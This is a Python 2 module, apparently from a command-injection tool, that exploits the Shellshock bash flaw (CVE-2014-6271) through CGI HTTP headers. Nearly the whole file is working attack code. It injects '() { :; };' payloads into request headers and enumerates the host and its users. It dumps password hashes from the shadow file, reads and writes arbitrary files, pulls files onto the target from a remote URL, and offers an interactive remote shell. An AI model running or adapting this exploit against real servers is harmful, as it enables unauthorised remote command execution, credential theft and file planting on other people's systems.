#!/usr/bin/env python

import re
import os
import sys
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

"""
This module exploits the vulnerability "CVE-2014-6271" [1] in Apache CGI.
[1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
"""

# Available HTTP headers
headers = [
"User-Agent",
"Referer",
"Cookie"
]

# Available Shellshock CVEs
shellshock_cves = [
"CVE-2014-6271",
]

"""
Available shellshock payloads
"""
def shellshock_payloads(cve, attack_vector):
  if cve == shellshock_cves[0] :
    payload = "() { :; }; " + attack_vector
  else:
    pass
  return payload

"""
Shellshock bug exploitation
"""
def shellshock_exploitation(cve, cmd):
  attack_vector = " echo; " + cmd + "; "
  payload = shellshock_payloads(cve, attack_vector)
  return payload

"""
Enumeration Options
"""
def enumeration(url, cve, check_header):
  #-------------------------------
  # Hostname enumeration
  #-------------------------------
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    shell = cmd_exec(url, cmd, cve, check_header)
    if menu.options.verbose:
      print ""
    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()

  #-------------------------------
  # Retrieve system information
  #-------------------------------
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS            
    target_os = cmd_exec(url, cmd, cve, check_header)
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      target_arch = cmd_exec(url, cmd, cve, check_header)
      if target_arch:
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
    else:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
      sys.stdout.flush()

  #-------------------------------
  # The current user enumeration
  #-------------------------------
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    cu_account = cmd_exec(url, cmd, cve, check_header)
    if cu_account:
      if menu.options.is_root:
        cmd = settings.ISROOT
        shell = cmd_exec(url, cmd, cve, check_header)
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        if shell:
          if shell != "0":
              sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
              sys.stdout.flush()
          else:
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
      else:
        if menu.options.verbose:
          print ""
        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
        sys.stdout.flush()

  #-------------------------------
  # System users enumeration
  #-------------------------------
  if menu.options.users:
    cmd = settings.SYS_USERS             
    sys_users = cmd_exec(url, cmd, cve, check_header)
    if sys_users :
      sys_users = "".join(str(p) for p in sys_users)
      sys_users = sys_users.replace("(@)", "\n")
      sys_users = sys_users.split( )
      if len(sys_users) != 0 :
        if menu.options.verbose:
          print ""
        sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
        sys.stdout.flush()
        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
        sys.stdout.flush()
        count = 0
        for line in sys_users:
          count = count + 1
          fields = line.split(":")
          # System users privileges enumeration
          if menu.options.privileges:
            if int(fields[1]) == 0:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
            elif int(fields[1]) > 0 and int(fields[1]) < 99 :
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
            elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
              if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
              elif int(fields[1]) == 60002:
                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
              else:
                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
            else :
              is_privilleged = ""
          else :
            is_privilleged = ""
          print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
      else:
        print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
    
    #-------------------------------------
    # System password enumeration
    #-------------------------------------
    if menu.options.passwords:
      cmd = settings.SYS_PASSES            
      sys_passes = cmd_exec(url, cmd, cve, check_header)
      if sys_passes :
        sys_passes = "".join(str(p) for p in sys_passes)
        sys_passes = sys_passes.replace("(@)", "\n")
        sys_passes = sys_passes.split( )
        if len(sys_passes) != 0 :
          sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
          sys.stdout.flush()
          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
          sys.stdout.flush()
          count = 0
          for line in sys_passes:
            count = count + 1
            fields = line.split(":")
            if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
              print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
        else:
          print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
          

"""
File Access Options
"""
def file_access(url, cve, check_header):

  #-------------------------------------
  # Read a file from the target host.
  #-------------------------------------
  if menu.options.file_read:
    file_to_read = menu.options.file_read
    # Execute command
    cmd = "cat " + settings.FILE_READ + file_to_read
    shell = cmd_exec(url, cmd, cve, check_header)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "(!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : \n")
      sys.stdout.flush()
      print shell
    else:
     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
     sys.stdout.flush()

  #-------------------------------------
  # Write to a file on the target host.
   #-------------------------------------
  if menu.options.file_write:
    file_to_write = menu.options.file_write
    if not os.path.exists(file_to_write):
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
      sys.stdout.flush()
      sys.exit(0)
      
    if os.path.isfile(file_to_write):
      with open(file_to_write, 'r') as content_file:
        content = [line.replace("\n", " ") for line in content_file]
      content = "".join(str(p) for p in content).replace("'", "\"")
    else:
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
      sys.stdout.flush()

    #-------------------------------
    # Check the file-destination
    #-------------------------------
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
    else:
      dest_to_write = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
    shell = cmd_exec(url, cmd, cve, check_header)
    
    # Check if file exists!
    cmd = "ls " + dest_to_write + ""
    # Check if defined cookie injection.
    shell = cmd_exec(url, cmd, cve, check_header)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
      sys.stdout.flush()
    else:
     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
     sys.stdout.flush()

  #-------------------------------------
  # Upload a file on the target host.
  #-------------------------------------
  if menu.options.file_upload:
    file_to_upload = menu.options.file_upload
    
    # Check if not defined URL for upload.
    if not re.match('https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?',file_to_upload):
      sys.stdout.write("\n" + Back.RED + "(x) Error: The '"+ file_to_upload + "' is not URL. " + Style.RESET_ALL + "\n")
      sys.stdout.flush()
      sys.exit(0)

    # check if remote file exists.
    try:
      urllib2.urlopen(file_to_upload)
    except urllib2.HTTPError, err:
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
      sys.stdout.flush()
      sys.exit(0)
      
    # Check the file-destination
    if os.path.split(menu.options.file_dest)[1] == "" :
      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
    elif os.path.split(menu.options.file_dest)[0] == "/":
      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
    else:
      dest_to_upload = menu.options.file_dest
      
    # Execute command
    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
    shell = cmd_exec(url, cmd, cve, check_header)
    shell = "".join(str(p) for p in shell)
    
    # Check if file exists!
    cmd = "ls " + dest_to_upload
    shell = cmd_exec(url, cmd, cve, check_header)
    shell = "".join(str(p) for p in shell)
    if shell:
      if menu.options.verbose:
        print ""
      sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
      sys.stdout.flush()
    else:
     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
     sys.stdout.flush()

"""
The main shellshock handler
"""
def shellshock_handler(url, http_request_method):
  no_result = True

  injection_type = "results-based command injection"
  technique = "shellshock injection technique"
  shellshoked = False

  sys.stdout.write("(*) Testing the "+ technique + "... ")
  sys.stdout.flush()

  try: 
    i = 0
    total = len(shellshock_cves) * len(headers)
    for check_header in headers:
      for cve in shellshock_cves:
        i = i + 1
        attack_vector = "echo " + cve + ":Done;"
        payload = shellshock_payloads(cve, attack_vector)

        # Check if defined "--verbose" option.
        if menu.options.verbose:
          sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)

        header = {check_header : payload}
        request = urllib2.Request(url, None, header)
        response = urllib2.urlopen(request)

        if not menu.options.verbose:
          percent = ((i*100)/total)
          if percent == 100:
            if no_result == True:
              percent = Fore.RED + "FAILED" + Style.RESET_ALL
            else:
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
          elif cve in response.info():
            percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
          else:
            percent = str(percent)+"%"

          sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
          sys.stdout.flush()

        if cve in response.info():
          no_result = False
          print Style.BRIGHT + "\n(!) The ("+ check_header + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
          
          # Enumeration options.
          enumeration(url, cve, check_header)

          # File access options.
          file_access(url, cve, check_header)

          if menu.options.os_cmd:
            cmd = menu.options.os_cmd 
            shell = cmd_exec(url, cmd, cve, check_header)
            print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
            sys.exit(0)

          else:
            while True:
              gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
                while True:
                  try:
                    cmd = raw_input("Shell > ")
                    if cmd == "q":
                      sys.exit(0)

                    else: 
                      shell = cmd_exec(url, cmd, cve, check_header)
                      print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
                  except KeyboardInterrupt:
                    print ""
                    sys.exit(0)

                  except:
                    print ""
                    sys.exit(0)

              elif gotshell in settings.CHOISE_NO:
                if menu.options.verbose:
                  sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                  sys.stdout.flush()
                break
              break
      else:
        continue

  except urllib2.HTTPError, err:
    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

  except urllib2.URLError, err:
    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL

"""
Execute user commands
"""
def cmd_exec(url, cmd, cve, check_header):
  """
  Check for shellshock 'shell'
  """
  def check_for_shell(url, cmd, cve, check_header):
    try:
      payload = shellshock_exploitation(cve, cmd)

      # Check if defined "--verbose" option.
      if menu.options.verbose:
        sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)

      header = { check_header : payload }
      request = urllib2.Request(url, None, header)
      response = urllib2.urlopen(request)
      shell = response.read().rstrip()
      return shell

    except urllib2.URLError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      sys.exit(0)

  shell = check_for_shell(url, cmd, cve, check_header)
  if len(shell) == 0:
    cmd = "/bin/" + cmd
    shell = check_for_shell(url, cmd, cve, check_header)
    if len(shell) == 0:
      cmd = "/usr" + cmd
      shell = check_for_shell(url, cmd, cve, check_header)
  return shell 

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, http_request_method):       
  if shellshock_handler(url, http_request_method) == False:
    return False

# eof